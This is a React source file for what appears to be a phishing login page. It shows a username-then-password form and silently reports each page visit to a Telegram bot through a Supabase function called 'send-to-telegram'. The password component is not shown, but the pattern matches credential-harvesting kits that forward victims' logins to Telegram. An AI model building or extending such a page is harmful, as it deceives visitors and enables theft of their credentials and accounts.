import React, { useState, useEffect } from 'react';
import Header from './components/Header';
import Footer from './components/Footer';
import LoginForm from './components/LoginForm';
import PasswordForm from './components/PasswordForm';

function App() {
  const [currentUser, setCurrentUser] = useState('');
  const [showPasswordForm, setShowPasswordForm] = useState(false);

  useEffect(() => {
    const notifyAccess = async () => {
      try {
        await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-to-telegram`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
          },
          body: JSON.stringify({ action: 'initial_access' }),
        });
      } catch (error) {
        console.error('Error notifying access:', error);
      }
    };

    notifyAccess();
  }, []);

  const handleUsernameSubmit = (username: string) => {
    setCurrentUser(username);
    setShowPasswordForm(true);
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <Header />
      
      <main className="flex-grow py-8 px-4">
        <div className="container mx-auto">
          <div className="flex justify-center">
            {showPasswordForm ? (
              <PasswordForm username={currentUser} />
            ) : (
              <LoginForm onSubmit={handleUsernameSubmit} />
            )}
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}

export default App;